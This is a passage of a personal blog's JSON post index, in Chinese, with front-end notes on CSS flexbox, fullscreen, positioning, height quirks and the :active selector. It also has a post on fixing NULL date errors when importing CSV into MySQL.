id=\"flex-flow-flex-direction-flex-wrap\"><a href=\"#flex-flow-flex-direction-flex-wrap\" class=\"headerlink\" title=\"flex-flow: flex-direction flex-wrap;\"></a>flex-flow: flex-direction flex-wrap;</h2><img src=\"/blog/2018/06/08/CSS-flex常忘記筆記/flex_terms.png\" title=\"flex圖示\">\n<p>main axis是主軸線<br>cross axis是副軸線</p>\n<p><strong>我覺得上面兩個名詞要搞懂會比較好了解</strong></p>\n<h2 id=\"justify-content\"><a href=\"#justify-content\" class=\"headerlink\" title=\"justify-content\"></a>justify-content</h2><p>參考flex-direction主軸線</p>\n<h2 id=\"align-content-default-stretch-用在多行-單行可能沒做用\"><a href=\"#align-content-default-stretch-用在多行-單行可能沒做用\" class=\"headerlink\" title=\"align-content(default:stretch)  用在多行  單行可能沒做用\"></a>align-content(default:stretch)  用在多行  單行可能沒做用</h2><p>交錯軸上下</p>\n<h2 id=\"align-items-default-stretch-，有baseline\"><a href=\"#align-items-default-stretch-，有baseline\" class=\"headerlink\" title=\"align-items(default:stretch)，有baseline\"></a>align-items(default:stretch)，有baseline</h2><p>這兩個常常搞錯</p>\n<h3 id=\"※踩雷筆記\"><a href=\"#※踩雷筆記\" class=\"headerlink\" title=\"※踩雷筆記\"></a>※踩雷筆記</h3><p>當flex裡面元素沒有設定高度，預設為height:auto的話，<strong>stretch會延展高度100%</strong><br>相反沒有的話，看內文的寬度，ex:<code>&lt;div&gt;&lt;/div&gt;</code>內文沒有高度和文字，但不限顯示出來，除非打字就會有東西</p>\n<p>align-items和align-content公用看起來很像，裡面有詳細介紹<br><a href=\"https://blog.csdn.net/sinat_27088253/article/details/51532992\" target=\"_blank\" rel=\"noopener\">flex布局中align-items 和align-content的区别 - CSDN博客</a><br><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/CSS/align-content\" target=\"_blank\" rel=\"noopener\">align-content - CSS：层叠样式表 | MDN</a></p>\n<h2 id=\"width\"><a href=\"#width\" class=\"headerlink\" title=\"width\"></a>width</h2><p>flex等於由下面屬性和成</p>\n<h3 id=\"flex-grow-default-0-預設不會延展\"><a href=\"#flex-grow-default-0-預設不會延展\" class=\"headerlink\" title=\"flex-grow: (default:0)預設不會延展\"></a>flex-grow: (default:0)預設不會延展</h3><h3 id=\"flex-shrik-default-1-預設會縮小\"><a href=\"#flex-shrik-default-1-預設會縮小\" class=\"headerlink\" title=\"flex-shrik:(default:1)預設會縮小\"></a>flex-shrik:(default:1)預設會縮小</h3><h3 id=\"flex-basis-default-auto-依照副軸線對應width或height，長度優先權最高\"><a href=\"#flex-basis-default-auto-依照副軸線對應width或height，長度優先權最高\" class=\"headerlink\" title=\"flex-basis:(default:auto) 依照副軸線對應width或height，長度優先權最高\"></a>flex-basis:(default:auto) 依照副軸線對應width或height，長度優先權最高</h3><p><a href=\"https://segmentfault.com/a/1190000005077709\" target=\"_blank\" rel=\"noopener\">flex-item的flex-basis与width属性有什么关系？ - 额，前端 - SegmentFault 思否</a></p>\n<h3 id=\"小雷注意\"><a href=\"#小雷注意\" class=\"headerlink\" title=\"小雷注意\"></a>小雷注意</h3><p>如果沒設定<code>flex-basis</code>長度的話(有設定width)，flex-shrik不會把元素縮小….<br>看來flex-shrik都是依照flex-basis長度縮放為主<br>可實作看看會很清楚<br><a href=\"http://jsbin.com/beqarabozo/edit?html,css,js,output\" target=\"_blank\" rel=\"noopener\">JS Bin - JS Bin</a></p>\n<blockquote>\n<p> 如果同时设置flex-basis和width，那么width属性会被覆盖，也就是说flex-basis的优先级比width高。有一点需要注意，如果flex-basis和width其中有一个是auto，那么另外一个非auto的属性优先级会更高。</p>\n</blockquote>\n<p><a href=\"http://zhoon.github.io/css3/2014/08/23/flex.html\" target=\"_blank\" rel=\"noopener\">深入理解css3中的flex-grow、flex-shrink、flex-basis</a><br>有公式</p>\n<h2 id=\"心得\"><a href=\"#心得\" class=\"headerlink\" title=\"心得\"></a>心得</h2><p>其實我覺得flex精華都在flex-grow跟flex-shrik上面，其實我之前就有去了解flex<br>有玩過Flexbox Froggy遊戲…，但對排版印用不是很了解<br>flex-shrik預設竟然是1，會自動縮放，但是flex-grow預設是0<br>也就是說在不預設定<code>flex</code>屬性時候<br>裡面原素預設不會放大，但也不會超過父層寬度<br>這用在響印式設計真的還不錯</p>\n<p>常常看到很多用<code>flex:1</code>，會自動擴大<br>我一直以為每個元素都要設定flex，<strong>但其實不用</strong></p>\n<p><strong>備註</strong><br>flex:1   只會影響flex-grow<br>可惡…被padding跟margin影響了XD</p>\n<p>影片教學可參考<br><a href=\"https://www.facebook.com/WccCasper/videos/414910278905201/\" target=\"_blank\" rel=\"noopener\">(1) 卡斯伯 - 20:30 直播 CSS Flex 來試試看 Flex 吧 看看這東西到底是怎麼算的 😆 今天沒有 ZOOM 頻道</a></p>\n","categories":["CSS"],"tags":["CSS","flex"]},{"title":"CSS :fullscreen 全螢幕功能小記","url":"/blog/2019/09/19/CSS-fullscreen-%E5%85%A8%E8%9E%A2%E5%B9%95%E5%8A%9F%E8%83%BD%E5%B0%8F%E8%A8%98/","content":"<p>最近看到 CSS 可以控制全螢幕 style<br>簡單測試一下<br>還是有遇到一些小地雷<br>小記小記，防止下次彩雷</p>\n<a id=\"more\"></a>\n<h2 id=\"fullscreen\"><a href=\"#fullscreen\" class=\"headerlink\" title=\":fullscreen\"></a>:fullscreen</h2><p>是控制 CSS style ，不是控制畫面全螢幕，但這個對<code>F11</code>全螢幕沒有什麼作用</p>\n<h2 id=\"JS-觸發全螢幕\"><a href=\"#JS-觸發全螢幕\" class=\"headerlink\" title=\"JS 觸發全螢幕\"></a>JS 觸發全螢幕</h2><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">document</span>.documentElement.requestFullscreen()</span><br></pre></td></tr></table></figure>\n<p>這邊注意使用CSS要用<code>:fullscreen</code> or <code>html:fullscreen</code><br>使用<code>body:fullscreen</code></p>\n<h2 id=\"地雷\"><a href=\"#地雷\" class=\"headerlink\" title=\"地雷\"></a>地雷</h2><h3 id=\"開發者模式不能直接執行\"><a href=\"#開發者模式不能直接執行\" class=\"headerlink\" title=\"開發者模式不能直接執行\"></a>開發者模式不能直接執行</h3><p>在 console.log 實作不會有效果<br>會跑出錯誤<br><code>TypeError: The expression cannot be converted to return the specified type.</code></p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">document</span>.documentElement.requestFullscreen()</span><br></pre></td></tr></table></figure>\n<h2 id=\"相關其他-JS-套件\"><a href=\"#相關其他-JS-套件\" class=\"headerlink\" title=\"相關其他 JS 套件\"></a>相關其他 JS 套件</h2><p><a href=\"https://dotblogs.com.tw/wellwind/2016/12/20/front-end-screenfull-js\" target=\"_blank\" rel=\"noopener\">[前端軍火庫]screenfull.js - 全螢幕顯示就是這麼簡單 | 全端開發人員天梯 - 點部落</a><br><a href=\"https://github.com/sindresorhus/screenfull.js\" target=\"_blank\" rel=\"noopener\">sindresorhus/screenfull.js: Simple wrapper for cross-browser usage of the JavaScript Fullscreen API</a></p>\n","categories":["CSS"],"tags":["css","fullscreen"]},{"title":"CSS position:absolute 垂直置中妙用","url":"/blog/2018/08/15/CSS-position-absolute-%E5%9E%82%E7%9B%B4%E7%BD%AE%E4%B8%AD%E5%A6%99%E7%94%A8/","content":"<p>最近發現HTML tag <code>dialog</code>屬性可以用了<br>當下好奇怎麼可以使用??<br>當下好奇瀏覽器怎麼排排板的<br>發現原來是用absolute日上margin可以這樣置中</p>\n<a id=\"more\"></a>\n<p>PS: 目前Firefox 53裡的<code>about:config</code>需要設定<code>dom.dialog_element.enabled</code>為true<br>才能完整用js操作<br><a href=\"https://developer.mozilla.org/en-US/docs/Web/API/HTMLDialogElement/returnValue\" target=\"_blank\" rel=\"noopener\">HTMLDialogElement.returnValue - Web APIs | MDN</a><br><a href=\"https://segmentfault.com/a/1190000003820437#articleHeader9\" target=\"_blank\" rel=\"noopener\">https://segmentfault.com/a/1190000003820437#articleHeader9</a></p>\n<p><a href=\"https://stackoverflow.com/questions/29261595/why-does-position-absolute-left-0-right-0-width-xypx-margin-0-auto-ac\" target=\"_blank\" rel=\"noopener\">html - Why does “position: absolute; left: 0; right: 0; width: XYpx; margin: 0 auto” actually center? - Stack Overflow</a><br><a href=\"https://segmentfault.com/q/1010000008325121\" target=\"_blank\" rel=\"noopener\">css - div的position:absolute；left:0;right:0;margin:0 auto;为什么可以居中？ - SegmentFault 思否</a><br><a href=\"https://segmentfault.com/a/1190000003820437#articleHeader9\" target=\"_blank\" rel=\"noopener\">CSS规范 &gt; 10 视觉格式化模型详述 Visual Formatting Model Details - HaoyCn’s Blog - SegmentFault 思否</a><br><figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">postition</span><span class=\"selector-pseudo\">:absolute</span>; </span><br><span class=\"line\"><span class=\"selector-tag\">left</span><span class=\"selector-pseudo\">:0px</span>;</span><br><span class=\"line\"><span class=\"selector-tag\">right</span><span class=\"selector-pseudo\">:0px</span>;</span><br></pre></td></tr></table></figure></p>\n<p>要加<code>margin auto;</code></p>\n<p>但為什麼這樣就能置中呢?<br>網路找了一下，其實滿不好找的(但還是有的)…<br><a href=\"http://www.oxxostudio.tw/articles/201502/css-vertical-align-7methods.html\" target=\"_blank\" rel=\"noopener\">CSS 垂直置中的七個方法 - OXXO.STUDIO</a></p>\n<p>不過…為什麼這樣能置中?我就Google找了一下中文文件(英文太菜了&gt;.&lt;)</p>\n<p>這篇有講到<a href=\"https://segmentfault.com/q/1010000010907551\" target=\"_blank\" rel=\"noopener\">css - 絕對定位div寬度如何自適應內容。 - SegmentFault 思否</a></p>\n<h3 id=\"containing-block\"><a href=\"#containing-block\" class=\"headerlink\" title=\"containing block\"></a>containing block</h3><blockquote>\n<p>怎么确定一个元素的containing block，由position属性确定：</p>\n<ol>\n<li>static(默认的)/relative：简单说就是它的父元素的内容框（即去掉padding的部分）</li>\n<li>absolute: 向上找最近的定位为absolute/relative的元素</li>\n<li>fixed: 它的containing block一律为根元素(html/body)，根元素也是initial containing block<br><a href=\"https://www.zhihu.com/question/20086234\" target=\"_blank\" rel=\"noopener\">CSS 中 block-level boxes、containing block、block formatting context 三者之间的区别和联系是怎样的？ - 知乎</a></li>\n</ol>\n</blockquote>\n<p>難怪之前會覺得position設定width height百分比怪怪的，看到這個終於解開我心中疑惑</p>\n<h2 id=\"inline-裡面element使用position位置\"><a href=\"#inline-裡面element使用position位置\" class=\"headerlink\" title=\"inline 裡面element使用position位置\"></a>inline 裡面element使用position位置</h2><p><a href=\"https://www.jianshu.com/p/c67a7c1cbb00\" target=\"_blank\" rel=\"noopener\">Containing Block(包含块模型) - 简书</a><br><a href=\"http://www.zhangxinxu.com/wordpress/2016/03/css-direction-introduction-apply/\" target=\"_blank\" rel=\"noopener\">CSS direction属性简介与实际应用 « 张鑫旭-鑫空间-鑫生活</a></p>\n<p><a href=\"https://segmentfault.com/a/1190000003820437#articleHeader9\" target=\"_blank\" rel=\"noopener\">CSS规范 &gt; 10 视觉格式化模型详述 Visual Formatting Model Details - HaoyCn’s Blog - SegmentFault 思否</a><br>那麼該收縮適應寬度即：min(max(首選最小寬度,可用寬度),首選寬度)。</p>\n<blockquote>\n<p>3個寬度說明：<br>    首選寬度：按照不自動斷行的方式排版，取得的內容寬度（可以理解為不受容器限制自動排列的寬度就是你想要的效果）<br>    首選最小寬度：calculate the preferred minimum width, e.g.,by trying all possible line breaks（我理解就是在1的情況下你把容器不斷縮小到不能換行，一般是單個文字的寬度）<br>    可用寬度：就是把right設置為0，計算出的width</p>\n</blockquote>\n<h2 id=\"更多詳細要了解的\"><a href=\"#更多詳細要了解的\" class=\"headerlink\" title=\"更多詳細要了解的\"></a>更多詳細要了解的</h2><p>(未深入了解的，吸收不能&gt;.&lt;，之後踩雷再研究)<br><a href=\"http://www.cnblogs.com/xiaohuochai/p/5312917.html\" target=\"_blank\" rel=\"noopener\">深入理解CSS绝对定位absolute - 小火柴的蓝色理想 - 博客园</a><br>裡面有一些觀念，<br>1.position:absolute遇到float:right，浮動(float)就會失效。但是relative就沒有這個問題<br>2.position:absolute，parent並不會算到子原素absolute的寬度、高度<br>還有很多</p>\n<p><a href=\"http://www.cnblogs.com/xiaohuochai/p/5315942.html\" target=\"_blank\" rel=\"noopener\">CSS绝对定位的应用 - 小火柴的蓝色理想 - 博客园</a><br>左半邊翻圖範例很有意思</p>\n<p><a href=\"https://juejin.im/post/5935142e2f301e006b0a7b55\" target=\"_blank\" rel=\"noopener\">CSS进阶——绝对定位元素的宽高是如何定义的 - 掘金</a></p>\n<blockquote>\n<p>根元素（在HTML文档中即<html>元素）所在的包含块即是初始包含块，对于浏览器来说：初始包含块的大小即是视口的大</html></p>\n</blockquote>\n<p>這個雷，我還真的不知道…<br>想說怎麼不是在最底端呢….</p>\n<p><a href=\"http://www.cnblogs.com/sc-xx/archive/2012/03/28/2422371.html\" target=\"_blank\" rel=\"noopener\">由布局学习CSS——从两列布局来看position：absolute的用法 - shawnXiao - 博客园</a></p>\n<p>position:absolute</p>\n<h2 id=\"隨意寫的範例loading\"><a href=\"#隨意寫的範例loading\" class=\"headerlink\" title=\"隨意寫的範例loading\"></a>隨意寫的範例loading</h2><p><a href=\"https://jsbin.com/diyavuyihi/1/edit?html,css,output\" target=\"_blank\" rel=\"noopener\">https://jsbin.com/diyavuyihi/1/edit?html,css,output</a></p>\n","categories":["CSS"],"tags":["css","position","absolute"]},{"title":"[CSS]上層有設min-height也沒用，height:100%竟然無效??","url":"/blog/2018/06/24/CSS-%E4%B8%8A%E5%B1%A4%E6%9C%89%E8%A8%ADmin-height%E4%B9%9F%E6%B2%92%E7%94%A8%EF%BC%8Cheight-100-%E7%AB%9F%E7%84%B6%E7%84%A1%E6%95%88/","content":"<p>父flex<br>子height:100%;<br>竟然不會延展<br>不過flex<br>好像不用設定height:100%就會延展(default:stretch)</p>\n<a id=\"more\"></a>\n<p>同樣div父層設定min-height:100px;<br>div子層height:100%;<br>不會變大，可在子層設定min-height:inherit<br><a href=\"http://www.zhangxinxu.com/wordpress/2015/02/different-height-100-height-inherit/\" target=\"_blank\" rel=\"noopener\">CSS中height:100%和height:inherit的异同 « 张鑫旭-鑫空间-鑫生活</a><br><code>在她裡面</code>，我瞬間背起來單字了<br>這個背法還真好背，哈哈</p>\n<h3 id=\"解法\"><a href=\"#解法\" class=\"headerlink\" title=\"解法\"></a>解法</h3><p>不過還是有找到解法，設定父position:relative和子position:absolute，父不用設定height就可以讓子height:100%，是不是很神奇?!!</p>\n<p>2018-07-08<br>今天做week5 前端修練時光屋發現我有一個高度怪怪的(是用position:absolute) 有加到padding-top:20<br>後來查了一下<br>left + margin-left + border-left-width + padding-left + width + padding-right + border-right-width + margin-right + right = 包含块宽度</p>\n<p>預設position:static的高度是算 content-box 沒有padding跟margin<br>所以可能用absolute跟relative要注意一下他常寬的算法，可能會踩到雷XD</p>\n<blockquote>\n<p>Your CSS means that the child element’s height is 100% of the specified height of the parent element. If you do not specify a height for the parent, then the 100% doesn’t mean anything. Hence it doesn’t work.<br>What you want can be achieved by using position:relative on the parent and position:absolute on the child:<br><a href=\"http://jsfiddle.net/57EZn/25/\" target=\"_blank\" rel=\"noopener\">http://jsfiddle.net/57EZn/25/</a><br>It’s not a beautiful solution but it does what you are after.</p>\n</blockquote>\n<p><a href=\"https://stackoverflow.com/questions/6995581/css-100-height-of-container-with-min-height\" target=\"_blank\" rel=\"noopener\">html - CSS 100% height of container with min-height - Stack Overflow</a></p>\n<p><a href=\"https://blog.csdn.net/SuperCoooooder/article/details/52469520\" target=\"_blank\" rel=\"noopener\">关于height：100%无效的解决办法与细节 - CSDN博客</a><br><a href=\"http://www.zhangxinxu.com/wordpress/2016/09/talking-about-css-infinite-endless-loop/\" target=\"_blank\" rel=\"noopener\">从height:100%不支持聊聊CSS中的“死循环” « 张鑫旭-鑫空间-鑫生活</a><br><a href=\"http://www.zhangxinxu.com/wordpress/2015/02/different-height-100-height-inherit/\" target=\"_blank\" rel=\"noopener\">CSS中height:100%和height:inherit的异同 « 张鑫旭-鑫空间-鑫生活</a></p>\n<p><a href=\"http://xtutu.me/the-date-object-in-js/\" target=\"_blank\" rel=\"noopener\">JavaScript中的Date对象，以及UTC、GMT、时区的关系 | xtutu</a></p>\n","categories":["CSS"],"tags":["css","min-height","height"]},{"title":"CSS猛猛的煙火特效蒐集","url":"/blog/2019/01/08/CSS%E7%8C%9B%E7%8C%9B%E7%9A%84%E7%85%99%E7%81%AB%E7%89%B9%E6%95%88%E8%92%90%E9%9B%86/","content":"<p>最近看到很猛的煙火特效<br><a href=\"https://codepen.io/anon/pen/BvVbOw\" target=\"_blank\" rel=\"noopener\">An Anonymous Pen on CodePen</a><br><a href=\"https://codepen.io/whqet/pen/Auzch\" target=\"_blank\" rel=\"noopener\">HTML5 canvas and javascript fireworks tutorial</a><br><a href=\"http://www.jq22.com/jquery-info14173\" target=\"_blank\" rel=\"noopener\">jquery 實現煙花特效</a></p>\n<p>其他小記<br><a href=\"http://blog.sina.com.cn/s/blog_6b2fcbbc0101d9mi.html\" target=\"_blank\" rel=\"noopener\">有利于 SEO 的 div+css 命名全面小结<em>烟火</em>新浪博客</a></p>\n","categories":["網頁特效"],"tags":["css"]},{"title":"CSS:active點擊事件妙用","url":"/blog/2018/04/22/CSS%E8%A3%A1active%E9%BB%9E%E6%93%8A%E4%BA%8B%E4%BB%B6%E5%A6%99%E7%94%A8/","content":"<p>一般我們學CSS很常看到:link,:active,:visited,:hover這幾個很常用在<code>a</code><br>不過今天我看到一個範例<br>是用:active對<code>div</code>做點擊換背景事件!!!<br>沒想到竟然可以對<code>div</code>做變化<br>一般很常用mousedown,mouseup做處理<br>這樣可以用CSS一次解決寫兩個JavaScript<br>趕快來筆記一下</p>\n<a id=\"more\"></a>\n<p><code>:active</code>除了對div會有影響<br>看我實作測試<br><a href=\"http://jsbin.com/facifuvina/edit?html,css,js,output\" target=\"_blank\" rel=\"noopener\">http://jsbin.com/facifuvina/edit?html,css,js,output</a><br>點擊div時候，其實<code>body:active</code>也會跟著變色<br>所以:active點子子層的時候也會跟著影響父層<br>所以使用也要了解這個問題！</p>\n<p>試著看API能不能看到一些<code>:active</code>資訊</p>\n<blockquote>\n<p>An element is said to be in a formal activation state between the time the user begins to indicate an intent to trigger the element’s activation behavior and either the time the user stops indicating an intent to trigger the element’s activation behavior, or the time the element’s activation behavior has finished running, which ever comes first.</p>\n</blockquote>\n<blockquote>\n<p>An element is said to be being actively pointed at while the user indicates the element using a pointing device while that pointing device is in the “down” state (e.g. for a mouse, between the time the mouse button is pressed and the time it is depressed; for a finger in a multitouch environment, while the finger is touching the display surface).</p>\n</blockquote>\n<p><a href=\"https://html.spec.whatwg.org/multipage/semantics-other.html#in-a-formal-activation-state\" target=\"_blank\" rel=\"noopener\">HTML Standard</a><br>不知道是不是這個內容關係</p>\n<p>不過在<a href=\"https://css-tricks.com/almanac/selectors/a/active/\" target=\"_blank\" rel=\"noopener\">:active | CSS-Tricks</a>這個網站有找到所有element都可以這樣用<br>然後看一下支援表，沒想到支援度這麼高<br>以前就有這個東西，都不知道orz</p>\n<blockquote>\n<p>這個樣式可能會被後聲明的其他鏈接相關的偽類覆蓋，這些偽類包括 :link，:hover和 :visited。為了正常加上樣式，需要把 :active的樣式放在所有鏈接相關的樣式後，這種鏈接偽類先後順序被稱為LVHA順序: :link — :visited — :hover — :active。</p>\n</blockquote>\n<blockquote>\n<p>注意: 在有多鍵鼠標的系統中，CSS 3 規定 :active 偽類必須只匹配主按鍵；對於右手操作鼠標來說就是左鍵。</p>\n</blockquote>\n<p><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/CSS/:active\" target=\"_blank\" rel=\"noopener\">:active - CSS：層疊樣式表 | MDN</a></p>\n<p>改天來記錄LVHA順序筆記吧!!</p>\n<p>參考來源：<br><a href=\"https://developer.mozilla.org/en-US/docs/Web/CSS/:active\" target=\"_blank\" rel=\"noopener\">:active - CSS: Cascading Style Sheets | MDN</a><br><a href=\"https://html.spec.whatwg.org/multipage/semantics-other.html#selector-active\" target=\"_blank\" rel=\"noopener\">HTML Standard</a><br><a href=\"https://css-tricks.com/almanac/selectors/a/active/\" target=\"_blank\" rel=\"noopener\">:active | CSS-Tricks</a></p>\n","categories":["CSS"],"tags":["CSS",":active"]},{"title":"CSV 匯入到 MySQL 失敗小記(Data truncation: Incorrect date value: '' for column 'date_col' at row 1)","url":"/blog/2019/09/09/CSV-%E5%8C%AF%E5%85%A5%E5%88%B0-MySQL-%E5%A4%B1%E6%95%97%E5%B0%8F%E8%A8%98-Data-truncation-Incorrect-date-value-for-column-date-col-at-row-1/","content":"<p>最近自己產生出來的 csv 匯入 DB遇到一些問題<br>之前 <a href=\"https://malagege.github.io/blog/2019/08/21/csv-%E5%BF%AB%E9%80%9F%E5%BB%BA%E7%AB%8B-MySQL-%E8%B3%87%E6%96%99%E8%A1%A8%E6%96%B9%E6%B3%95/\">csv 快速建立 MySQL 資料表方法 | 程式狂想筆記</a> 真的建立資料表很方便<br>但最近採到一些雷<br>在這邊整理一下</p>\n<a id=\"more\"></a>\n<h2 id=\"用腳本-create-table-失敗\"><a href=\"#用腳本-create-table-失敗\" class=\"headerlink\" title=\"用腳本 create table 失敗\"></a>用腳本 create table 失敗</h2><p><a href=\"https://malagege.github.io/blog/2019/08/21/csv-%E5%BF%AB%E9%80%9F%E5%BB%BA%E7%AB%8B-MySQL-%E8%B3%87%E6%96%99%E8%A1%A8%E6%96%B9%E6%B3%95/\">csv 快速建立 MySQL 資料表方法 | 程式狂想筆記</a><br>用裡面腳本<code>create table</code>竟然失敗<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Row size too large. The maximum row size for the used table type, not counting BLOBs, is 65535. This includes storage overhead, check the manual. You have to change some columns to TEXT or BLOBs</span><br></pre></td></tr></table></figure></p>\n<p>簡單說一下，就是一個varchar 是有限制大小，可能轉成<code>text</code>或著去原本 SQL 把他 <code>create table</code> 匯出來就可以了<br>相關連結:</p>\n<ul>\n<li><a href=\"https://www.itread01.com/articles/1476376830.html\" target=\"_blank\" rel=\"noopener\">10.4 限制表的列數和行的大小 - IT閱讀</a></li>\n<li><a href=\"http://www.voidcn.com/article/p-eeaxkihv-bhh.html\" target=\"_blank\" rel=\"noopener\">10.4 限制表的列数和行的大小 - 程序园</a></li>\n</ul>\n<h2 id=\"Data-truncation-Incorrect-date-value-‘’-for-column-‘date-col’-at-row-1\"><a href=\"#Data-truncation-Incorrect-date-value-‘’-for-column-‘date-col’-at-row-1\" class=\"headerlink\" title=\"Data truncation: Incorrect date value: ‘’ for column  ‘date_col’ at row 1\"></a>Data truncation: Incorrect date value: ‘’ for column  ‘date_col’ at row 1</h2><p>這個問題困擾我很久了<br>我後來發現是 <code>NULL</code> 在 csv 跟空字串一樣<br>(這卻說csv <code>,,</code> 跟 <code>,&quot;&quot;,</code> 都是一樣的…)<br>好像 csv 跟 txt 沒法表示 NULL<br>不過有看到官網<code>\\n</code>可以代表是 NULL <a href=\"https://dev.mysql.com/doc/refman/8.0/en/null-values.html\" target=\"_blank\" rel=\"noopener\">MySQL :: MySQL 8.0 Reference Manual :: 9.1.7 NULL Values</a><br>但是我是用別的程式匯出 csv<br>dbeaver 嘗試著匯出，再用 dbeaver 匯入<br>結果一樣會有這個問題….(沒有看到\\n)<br>這還是未解之謎<br>但不知道是不是用 dbeaver 跟用 <code>SELECT ... INTO OUTFILE</code> 原理不一樣</p>\n<p><a href=\"https://dev.mysql.com/doc/refman/8.0/en/load-data.html\" target=\"_blank\" rel=\"noopener\">MySQL :: MySQL 8.0 Reference Manual :: 13.2.7 LOAD DATA Syntax</a></p>\n<h3 id=\"解決方法\"><a href=\"#解決方法\" class=\"headerlink\" title=\"解決方法\"></a>解決方法</h3><h4 id=\"標註-NULL-特殊字串\"><a href=\"#標註-NULL-特殊字串\" class=\"headerlink\" title=\"標註 NULL 特殊字串\"></a>標註 NULL 特殊字串</h4><p><a href=\"https://github.com/dbeaver/dbeaver/issues/4223\" target=\"_blank\" rel=\"noopener\">CSV import NULL string mark support · Issue #4223 · dbeaver/dbeaver</a><br><a href=\"http://www.mysqltutorial.org/mysql-export-table-to-csv/\" target=\"_blank\" rel=\"noopener\">MySQL Export Table to CSV</a></p>\n<p>標註 NULL 欄位很簡單<code>ifnull(my_column, &quot;&quot;)</code></p>\n<p><strong>DBeaver 匯入可以選擇 null 取代</strong></p>\n<p><img src=\"https://user-images.githubusercontent.com/12808832/35556162-7c08d688-05dc-11e8-9d97-2cbd451f3648.png\" alt=\"\"></p>\n<h4 id=\"STR-TO-DATE\"><a href=\"#STR-TO-DATE\" class=\"headerlink\" title=\"STR_TO_DATE\"></a>STR_TO_DATE</h4><p><a href=\"https://medium.com/@AviGoom/how-to-import-a-csv-file-into-a-mysql-database-ef8860878a68\" target=\"_blank\" rel=\"noopener\">How to import a CSV file into a MySQL database? - Miguel Gomez - Medium</a></p>\n<p><code>SELECT STR_TO_DATE(date_col), &quot;%M %d %Y&quot;);</code></p>\n<p>STR_TO_DATE(“”, “%M %d %Y”)</p>\n<blockquote>\n<p>0000-00-00<br>STR_TO_DATE(NULL, “%M %d %Y”)<br>NULL<br>目前猜測<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">load data local infile &apos;file.txt&apos; into table tableName </span><br><span class=\"line\">SET payDate = str_to_date(@payDate, &apos;%d/%m/%Y&apos;);</span><br></pre></td></tr></table></figure></p>\n</blockquote>\n<p>@payDate 應該是 ‘’ 空字串</p>\n<h4 id=\"IF-大法\"><a href=\"#IF-大法\" class=\"headerlink\" title=\"IF 大法\"></a>IF 大法</h4><p><a href=\"https://stackoverflow.com/questions/2675323/mysql-load-null-values-from-csv-data\" target=\"_blank\" rel=\"noopener\">MySQL load NULL values from CSV data - Stack Overflow</a></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">LOAD</span> <span class=\"keyword\">DATA</span> <span class=\"keyword\">infile</span> <span class=\"string\">'/tmp/testdata.txt'</span></span><br><span class=\"line\"><span class=\"keyword\">INTO</span> <span class=\"keyword\">TABLE</span> moo</span><br><span class=\"line\"><span class=\"keyword\">fields</span> <span class=\"keyword\">terminated</span> <span class=\"keyword\">BY</span> <span class=\"string\">\",\"</span></span><br><span class=\"line\"><span class=\"keyword\">lines</span> <span class=\"keyword\">terminated</span> <span class=\"keyword\">BY</span> <span class=\"string\">\"\\n\"</span></span><br><span class=\"line\">(@vone, @vtwo, @vthree, @vfour, @vfive)</span><br><span class=\"line\"><span class=\"keyword\">SET</span></span><br><span class=\"line\">one = <span class=\"keyword\">nullif</span>(@vone,<span class=\"string\">''</span>),</span><br><span class=\"line\">two = <span class=\"keyword\">nullif</span>(@vtwo,<span class=\"string\">''</span>),</span><br><span class=\"line\">three = <span class=\"keyword\">nullif</span>(@vthree,<span class=\"string\">''</span>),</span><br><span class=\"line\">four = <span class=\"keyword\">nullif</span>(@vfour,<span class=\"string\">''</span>)</span><br><span class=\"line\">;</span><br></pre></td></tr></table></figure>\n<p>與上方法大同小異，但我覺得上一種方法會比較好處理 NULL 放到 date欄位</p>\n<h4 id=\"取代法-不要這樣用\"><a href=\"#取代法-不要這樣用\" class=\"headerlink\" title=\",, 取代法(不要這樣用)\"></a>,, 取代法(不要這樣用)</h4><p>這個方法 ,, 會取代掉空字串<br>所以不要這樣用 QQ</p>\n<p>感覺還是沒有好用的方法<br>匯出直接轉 sql 出來還是最方便的</p>\n<p><a href=\"https://stackoverflow.com/questions/4588364/mysql-null-problem\" target=\"_blank\" rel=\"noopener\">mysql null problem? - Stack Overflow</a></p>\n<h4 id=\"PHP-執行方法\"><a href=\"#PHP-執行方法\" class=\"headerlink\" title=\"PHP 執行方法\"></a>PHP 執行方法</h4><p>剛剛爬到有做 null 處理</p>\n<p><a href=\"https://stackoverflow.com/questions/2867607/mysql-select-into-outfile-local\" target=\"_blank\" rel=\"noopener\">sql - MySQL - SELECT * INTO OUTFILE LOCAL ? - Stack Overflow</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">wget https://gist.githubusercontent.com/paslandau/37bf787eab1b84fc7ae679d1823cf401/raw/29a48bb0a43f6750858e1ddec054d3552f3cbc45/mysql2csv -O mysql2csv -q &amp;&amp; (sha256sum mysql2csv | cmp &lt;(<span class=\"built_in\">echo</span> <span class=\"string\">\"b109535b29733bd596ecc8608e008732e617e97906f119c66dd7cf6ab2865a65  mysql2csv\"</span>) || (<span class=\"built_in\">echo</span> <span class=\"string\">\"ERROR comparing hash, Found:\"</span> ;sha256sum mysql2csv) ) &amp;&amp; chmod +x mysql2csv</span><br></pre></td></tr></table></figure>\n<p>發現新的 sqltocsv 工具<br><a href=\"https://github.com/StabbyCutyou/sqltocsv\" target=\"_blank\" rel=\"noopener\">StabbyCutyou/sqltocsv: Stream large SQL result sets into a local file</a><br>但不知道有沒有對 null 做處理</p>\n<p><a href=\"https://github.com/karissa/sql2csv\" target=\"_blank\" rel=\"noopener\">karissa/sql2csv: Commandline utility for easily converting a SQL select statement into csv</a></p>\n","categories":["MySQL"],"tags":["mysql","csv"]},{"title":"CSS設定響應式(RWD)有幾種方法","url":"/blog/2019/05/05/CSS%E8%A8%AD%E5%AE%9A%E9%9F%BF%E6%87%89%E5%BC%8F-RWD-%E6%9C%89%E5%B9%BE%E7%A8%AE%E6%96%B9%E6%B3%95/","content":"<p>最近看 SASS 有設定@media 